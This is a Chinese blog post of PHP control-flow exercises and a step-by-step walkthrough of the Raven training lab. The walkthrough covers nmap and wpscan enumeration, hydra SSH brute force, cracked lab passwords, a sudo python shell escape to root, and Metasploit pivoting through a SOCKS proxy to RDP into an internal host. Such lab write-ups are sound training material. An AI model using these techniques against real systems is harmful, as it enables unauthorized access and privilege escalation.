<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="php数组练习与渗透测试初识"><meta name="keywords" content="Web"><meta name="author" content="wickt42"><meta name="copyright" content="wickt42"><title>php数组练习与渗透测试初识 | Wickt42's Tech Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '7.3.0'
} </script><meta name="generator" content="Hexo 7.3.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E3%80%81%E4%BD%BF%E7%94%A8if%E8%AF%AD%E5%8F%A5%E5%AE%9E%E7%8E%B0%E5%A6%82%E4%B8%8B%E6%95%88%E6%9E%9C%EF%BC%8C%E5%BD%93%E6%88%90%E7%BB%A9%E5%9C%A860%E4%BB%A5%E4%B8%8A%E6%97%B6%E4%B8%BA%E5%8F%8A%E6%A0%BC%EF%BC%8C60%E4%BB%A5%E4%B8%8B%E6%97%B6%E4%B8%BA%E4%B8%8D%E5%8F%8A%E6%A0%BC"><span class="toc-number">1.</span> <span class="toc-text">1、使用if语句实现如下效果，当成绩在60以上时为及格，60以下时为不及格</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8switch%E8%AF%AD%E5%8F%A5%E5%AE%9E%E7%8E%B0%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E7%AB%AF%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0%EF%BC%8Cnumber-1%E8%83%BD%E5%A4%9F%E6%98%BE%E7%A4%BA%E4%B8%BA%E4%B8%80%E6%9C%88%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%90%8E%E7%BB%AD%E7%9A%84%E6%9C%88%E4%BB%BD"><span class="toc-number">2.</span> <span class="toc-text">2、使用switch语句实现在浏览器端传递参数，number&#x3D;1能够显示为一月，以及后续的月份</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8%E5%BE%AA%E7%8E%AF%E6%89%93%E5%8D%B01-100%E7%9A%84%E6%95%B0%E5%AD%97%EF%BC%8C%E8%A6%81%E6%B1%82%E5%BD%93%E6%95%B0%E5%AD%97%E4%B8%BA17%E7%9A%84%E6%95%B4%E6%95%B0%E5%80%8D%E6%97%B6%EF%BC%8C%E4%B8%8D%E8%BE%93%E5%87%BA%E5%BD%93%E5%89%8D%E6%95%B0%E5%AD%97"><span class="toc-number">3.</span> <span class="toc-text">3、使用循环打印1-100的数字，要求当数字为17的整数倍时，不输出当前数字</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4%E3%80%81%E5%B0%9D%E8%AF%95%E9%80%9A%E5%85%B3Raven%E9%9D%B6%E5%9C%BA%EF%BC%8C%E8%A7%A3%E9%87%8A%E6%AF%8F%E4%B8%80%E6%AD%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%90%AB%E4%B9%89%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%BD%93%E5%89%8D%E6%AD%A5%E9%AA%A4%E8%BF%98%E5%8F%AF%E4%BB%A5%E6%9C%89%E5%93%AA%E4%BA%9B%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">4、尝试通关Raven靶场，解释每一步操作的含义，以及当前步骤还可以有哪些渗透思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%A9%E5%B1%951%E3%80%81%E4%BD%BF%E7%94%A8else-if%E4%BC%98%E5%8C%96%E7%AC%AC%E4%B8%80%E9%A2%98%E7%A8%8B%E5%BA%8F%EF%BC%8C90-100%E4%B8%BA%E4%BC%98%E7%A7%80%EF%BC%8C80-89%E8%89%AF%E5%A5%BD%EF%BC%8C60-79%E5%8F%8A%E6%A0%BC-60%E4%BB%A5%E4%B8%8B%E4%B8%8D%E5%8F%8A%E6%A0%BC%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%95%B0%E5%AD%97%E4%B8%8D%E5%9C%A80-100%E8%8C%83%E5%9B%B4%E4%B9%8B%E5%86%85%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3"><span class="toc-number">5.</span> <span class="toc-text">扩展1、使用else if优化第一题程序，90-100为优秀，80-89良好，60-79及格,60以下不及格，如果数字不在0-100范围之内如何解决</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%A9%E5%B1%952%E3%80%81%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8michael%E7%94%A8%E6%88%B7%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83%EF%BC%8C%E7%BB%93%E6%9E%9C%E4%B8%8D%E9%87%8D%E8%A6%81%EF%BC%8C%E6%88%AA%E5%9B%BE%E4%BD%93%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%93%8D%E4%BD%9C%E5%92%8C%E6%80%9D%E8%B7%AF"><span class="toc-number">6.</span> <span class="toc-text">扩展2、尝试使用michael用户进行提权，结果不重要，截图体现自己的操作和思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9ASUID%E6%8F%90%E6%9D%83"><span class="toc-number">6.1.</span> <span class="toc-text">方法一：SUID提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">6.2.</span> <span class="toc-text">方法二：内核提权</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250729165900674.jpg"></div><div class="author-info__name text-center">wickt42</div><div class="author-info__description text-center">Information Security</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/wickt42/wickt42.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">23</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">5</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">23</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://github.com/">github</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody">hexo-theme-melody</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250729164955479.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Wickt42's Tech Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/slides">Slides</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">php数组练习与渗透测试初识</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2025-08-13</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web/">Web</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web/php%E5%9F%BA%E7%A1%80/">php基础</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web/php%E5%9F%BA%E7%A1%80/php%E5%9F%BA%E7%A1%802/">php基础2</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="1、使用if语句实现如下效果，当成绩在60以上时为及格，60以下时为不及格"><a href="#1、使用if语句实现如下效果，当成绩在60以上时为及格，60以下时为不及格" class="headerlink" title="1、使用if语句实现如下效果，当成绩在60以上时为及格，60以下时为不及格"></a>1、使用if语句实现如下效果，当成绩在60以上时为及格，60以下时为不及格</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$goat1[] = 90;</span><br><span class="line">$goat1[] = 59;</span><br><span class="line">$goat1[] = 80;</span><br><span class="line">$goat1[] = 24;</span><br><span class="line"></span><br><span class="line">for ($i = 0; $i &lt; count($goat1); $i++) &#123;</span><br><span class="line">	if ($goat1[$i] &gt;= 60) &#123;</span><br><span class="line">		echo &quot;恭喜你及格了，分数：&quot; . $goat1[$i] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;非常遗憾没有及格，分数：&quot; . $goat1[$i] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813161012187.png" alt="image-20250813161005144"></p>
<h1 id="2、使用switch语句实现在浏览器端传递参数，number-1能够显示为一月，以及后续的月份"><a href="#2、使用switch语句实现在浏览器端传递参数，number-1能够显示为一月，以及后续的月份" class="headerlink" title="2、使用switch语句实现在浏览器端传递参数，number&#x3D;1能够显示为一月，以及后续的月份"></a>2、使用switch语句实现在浏览器端传递参数，number&#x3D;1能够显示为一月，以及后续的月份</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$month = $_GET[&#x27;number&#x27;];</span><br><span class="line"></span><br><span class="line">switch ($month) &#123;</span><br><span class="line">	case &#x27;1&#x27;:</span><br><span class="line">		print &#x27;1月&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">	case &#x27;2&#x27;:</span><br><span class="line">		print &#x27;2月&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">	case &#x27;3&#x27;:</span><br><span class="line">		print &#x27;3月&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">	case &#x27;4&#x27;:</span><br><span class="line">		print &#x27;4月&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">	case &#x27;5&#x27;:</span><br><span class="line">		print &#x27;5月&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">	case &#x27;6&#x27;:</span><br><span class="line">		print &#x27;6月&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">	case &#x27;7&#x27;:</span><br><span class="line">		print &#x27;7月&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">	case &#x27;8&#x27;:</span><br><span class="line">		print &#x27;8月&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">	case &#x27;9&#x27;:</span><br><span class="line">		print &#x27;9月&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">	case &#x27;10&#x27;:</span><br><span class="line">		print &#x27;10月&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">	case &#x27;11&#x27;:</span><br><span class="line">		print &#x27;11月&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">	case &#x27;12&#x27;:</span><br><span class="line">		print &#x27;12月&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">	default:</span><br><span class="line">		print &#x27;输入范围错误&#x27; . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813162338080.png" alt="image-20250813162338048"></p>
<h1 id="3、使用循环打印1-100的数字，要求当数字为17的整数倍时，不输出当前数字"><a href="#3、使用循环打印1-100的数字，要求当数字为17的整数倍时，不输出当前数字" class="headerlink" title="3、使用循环打印1-100的数字，要求当数字为17的整数倍时，不输出当前数字"></a>3、使用循环打印1-100的数字，要求当数字为17的整数倍时，不输出当前数字</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="number">101</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$i</span> % <span class="number">17</span> == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$i</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813163205608.png" alt="image-20250813163205569"></p>
<h1 id="4、尝试通关Raven靶场，解释每一步操作的含义，以及当前步骤还可以有哪些渗透思路"><a href="#4、尝试通关Raven靶场，解释每一步操作的含义，以及当前步骤还可以有哪些渗透思路" class="headerlink" title="4、尝试通关Raven靶场，解释每一步操作的含义，以及当前步骤还可以有哪些渗透思路"></a>4、尝试通关Raven靶场，解释每一步操作的含义，以及当前步骤还可以有哪些渗透思路</h1><p>首先打开nmap扫描局域网内的主机查看这个网段有多少存活主机，kali主机ip为192.168.142.132</p>
<p>（这里扫描存活主机还可以使用其他工具<code>arp-scan</code>、<code>masscan</code>、<code>fping</code>等）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.142.0/24</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250711154450520.png" alt="image-20250711154450520"></p>
<p>注意到有许多的ip，一个一个网页IP去访问，发现192.168.142.139这个IP可以访问到网站，那么可以确定这个就是目标主机了</p>
<p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20250711154640080.png" alt="image-20250711154640080"></p>
<p>继续使用nmap扫描这个ip，，扫描出来了很多的信息，可以看到这台服务器的22端口开启，这个端口一般运行的是ssh服务，可以尝试通过这个端口爆破账号密码进行远程连接。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.142.139</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813183533351.png" alt="image-20250711154828628"></p>
<p>由于上一步没有进行ssh爆破，这里接着进行目录扫描，扫描网站目录结构dirb <a target="_blank" rel="noopener" href="http://192.168.142.139,发现一个wordpress目录.wordpress是一个开源的博客工具、发布平台和内容管理系统,那么网上肯定能看到这个系统的历史漏洞,还可以根据网络上提到的漏洞进行攻击./">http://192.168.142.139，发现一个wordpress目录。wordpress是一个开源的博客工具、发布平台和内容管理系统，那么网上肯定能看到这个系统的历史漏洞，还可以根据网络上提到的漏洞进行攻击。</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813183533334.png" alt="image-20250711155221236"></p>
<p>访问wordpress目录helloword超链接，发现被指向域名</p>
<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813183533333.png" alt="image-20250711155604646"></p>
<p>修改&#x2F;etc&#x2F;hosts文件，在文件里面新添加一行<code>192.168.142.139 raven.local</code>，让kali主机在解析raven.local这个域名时指向192.168.142.139这个地址</p>
<p>（还可以直接在浏览器输入<a target="_blank" rel="noopener" href="http://192.168.142.139/wordpress/wp-login.php%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%EF%BC%89">http://192.168.142.139/wordpress/wp-login.php进行访问）</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813183533360.png" alt="image-20250711155850784"></p>
<p>继续扫描这个框架，使用wpscan工具wordpress的专用扫描器，发现存在两个用户:michael以及steven</p>
<p>（这里的用户是这个web应用的用户，不是这个linux系统的用户，但是这个靶场为了实验的方便将这两个用户也添加到了系统）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.142.139/wordpress --wp-content-dir -at -eu</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813183535018.png" alt="image-20250711160337404"></p>
<p>现在开始爆破用户，首先是michael用户，在终端中输入。-l（小写）指定用户名若是大写L则是指定一个用户名集合的文件，-p同理）</p>
<p>使用破解成功的账户密码michael michael</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.139</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813183834234.png" alt="image-20250813183834181"></p>
<p>接下来是steven用户，同样使用命令<code>hydra -l steven -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.139</code>，steven用户在爆破密码时速度就比较慢了（steven用户密码为pink84）</p>
<p>这里先登录michael用户，发现michael用户没有sudo权限，那么走sudo权限这条路就行不通了</p>
<p>（如果sudo权限行不通，那么还可以试试 suid 提权，或是内核漏洞提权等操作）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh michael@192.168.142.139</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813184312884.png" alt="image-20250711162554699"></p>
<p>使用steven连接SSH，尝试用sudo -l<br>发现steven用户可以不用输入命令就能够使用python，在开发中python可以调用系统命令字，那么在这里可以使用python进行提权<br>可以看到提权后变成root用户了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh steven@192.168.142.139</span><br><span class="line"><span class="built_in">sudo</span> python -c <span class="string">&#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># 这条命令是使用python的 os.system() 函数直接调用 /bin/sh，获得一个新的 root 权限的交互式 Shell</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813184618213.png" alt="image-20250711162746610"></p>
<p>为了模拟真实的内网环境这里新添加了一块网卡，此时需要我们自己去启动这个网卡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;auto eth1&quot;</span> &gt;&gt; /etc/network/interfaces			<span class="comment"># 设置网卡 eth1 为自启动</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;iface eth1 inet dhcp&quot;</span> &gt;&gt; /etc/network/interfaces			<span class="comment"># 让网卡 eth1 使用 DHCP 协议自动获取 IP 地址</span></span><br><span class="line">ifconfig eth1 up			<span class="comment"># 立即手工启用网卡</span></span><br><span class="line">systemctl restart networking</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入完后第二张网卡就启动了</span></span><br></pre></td></tr></table></figure>

<p>接着在kali主机上输入命令，登录上raven服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole				<span class="comment"># 开启 metasploit 工具</span></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login			<span class="comment"># 加载 Metasploit 自带的 SSH 登录扫描模块</span></span><br><span class="line"><span class="built_in">set</span> username michael						<span class="comment"># 输入登录的账号</span></span><br><span class="line"><span class="built_in">set</span> password michael						<span class="comment"># 输入登录账号的密码</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.142.139					<span class="comment"># 输入目标主机</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813185756281.png" alt="image-20250711163946218"></p>
<p>获取session后，提升到meterpreter session:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sessions -l</span><br><span class="line">sessions -u 1		<span class="comment"># 重新获取一个连接，由于之前 shell 是普通 shell 不能够进行注入木马等操作，需要获得一个能够注入木马的 shell 以实现更多的操作</span></span><br><span class="line">sessions -i 2</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813190212989.png" alt="image-20250711164431647"></p>
<p>接着设置自动路由将raven主机作为跳板</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute			<span class="comment"># 把跳板机发现的内网网段自动加入 Metasploit 路由</span></span><br><span class="line">run autoroute -p			<span class="comment"># 查看/确认当前有哪些网段被自动路由到哪个会话</span></span><br><span class="line">background			<span class="comment"># 使用ctrl+C会退出整个控制终端，使用这个命令只退出当前操作</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813190343945.png" alt="image-20250711164613220"></p>
<p>Metasploit 里启动一个内置的 SOCKS 代理服务器，让本地所有流量都能通过 Metasploit 已建立的会话转发到目标内网。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy			<span class="comment"># 加载 metasploit 的代理模块</span></span><br><span class="line">options				<span class="comment"># 查看/修改监听地址和端口</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813190404122.png" alt="image-20250711165126309"></p>
<p>配置流量客户端工具</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line"><span class="comment"># 在文件中写入 socks5 127.0.0.1 1080，注意把上面的 socks4 注释下面的才能正常使用</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813190440936.png" alt="image-20250711165406205"></p>
<p>远程桌面连接内网主机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains rdesktop -u admin -p 123456 192.168.75.128</span><br><span class="line"><span class="comment"># （proxychains这个命令是让其他部分命令的流量发送个proxychains这个工具）（目前使用失败）原因 rdesktop 对现代 TLS/SSL 协议的支持不足，如果是连接 win7 那么就能够成功连接</span></span><br><span class="line"></span><br><span class="line">proxychains xfreerdp /u:admin /p:123456 /v:192.168.75.128 +sec-nla</span><br><span class="line"><span class="comment"># 这个命令使用成功（不过需要下载freerdp，sudo apt install freerdp2-x11）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实测proxychains xfreerdp /u:admin /p:123456 /v:192.168.75.128命令同样可行</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813190514060.png" alt="image-20250711172047720"></p>
<h1 id="扩展1、使用else-if优化第一题程序，90-100为优秀，80-89良好，60-79及格-60以下不及格，如果数字不在0-100范围之内如何解决"><a href="#扩展1、使用else-if优化第一题程序，90-100为优秀，80-89良好，60-79及格-60以下不及格，如果数字不在0-100范围之内如何解决" class="headerlink" title="扩展1、使用else if优化第一题程序，90-100为优秀，80-89良好，60-79及格,60以下不及格，如果数字不在0-100范围之内如何解决"></a>扩展1、使用else if优化第一题程序，90-100为优秀，80-89良好，60-79及格,60以下不及格，如果数字不在0-100范围之内如何解决</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$goat1</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">111</span>,</span><br><span class="line">    <span class="number">45</span>,</span><br><span class="line">	<span class="number">24</span>,</span><br><span class="line">	-<span class="number">123</span>,</span><br><span class="line">	<span class="number">90</span>,</span><br><span class="line">	<span class="number">86</span>,</span><br><span class="line">	<span class="number">75</span>,</span><br><span class="line">	<span class="number">44</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$goat1</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$goat1</span>[<span class="variable">$i</span>] &gt;= <span class="number">90</span> &amp;&amp; <span class="variable">$goat1</span>[<span class="variable">$i</span>] &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;优秀，分数：&quot;</span> . <span class="variable">$goat1</span>[<span class="variable">$i</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$goat1</span>[<span class="variable">$i</span>] &gt;= <span class="number">80</span> &amp;&amp; <span class="variable">$goat1</span>[<span class="variable">$i</span>] &lt; <span class="number">90</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;良好，分数：&quot;</span> . <span class="variable">$goat1</span>[<span class="variable">$i</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$goat1</span>[<span class="variable">$i</span>] &gt;= <span class="number">60</span> &amp;&amp; <span class="variable">$goat1</span>[<span class="variable">$i</span>] &lt; <span class="number">79</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;及格，分数：&quot;</span> . <span class="variable">$goat1</span>[<span class="variable">$i</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$goat1</span>[<span class="variable">$i</span>] &gt;= <span class="number">0</span> &amp;&amp; <span class="variable">$goat1</span>[<span class="variable">$i</span>] &lt; <span class="number">60</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;不及格，分数：&quot;</span> . <span class="variable">$goat1</span>[<span class="variable">$i</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;错误分数：&quot;</span> . <span class="variable">$goat1</span>[<span class="variable">$i</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="扩展2、尝试使用michael用户进行提权，结果不重要，截图体现自己的操作和思路"><a href="#扩展2、尝试使用michael用户进行提权，结果不重要，截图体现自己的操作和思路" class="headerlink" title="扩展2、尝试使用michael用户进行提权，结果不重要，截图体现自己的操作和思路"></a>扩展2、尝试使用michael用户进行提权，结果不重要，截图体现自己的操作和思路</h1><h2 id="方法一：SUID提权"><a href="#方法一：SUID提权" class="headerlink" title="方法一：SUID提权"></a>方法一：SUID提权</h2><p>首先查看哪些文件具有suid权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250813201442235.png" alt="image-20250813201442179"></p>
<p>接下来可以上网搜索有哪些可以进行suid提权的办法</p>
